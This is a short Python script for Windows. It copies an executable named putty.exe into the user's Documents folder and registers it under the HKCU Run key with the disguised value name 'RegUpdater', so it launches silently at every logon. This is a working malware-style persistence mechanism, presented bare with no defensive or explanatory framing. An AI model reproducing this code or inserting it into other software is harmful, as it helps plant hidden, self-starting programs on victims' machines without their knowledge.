import os
import shutil
import subprocess
import winreg

path = os.getcwd().strip('\n')

null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split(b'=')

destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'putty.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\putty.exe', str(destination))
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
    key.Close()
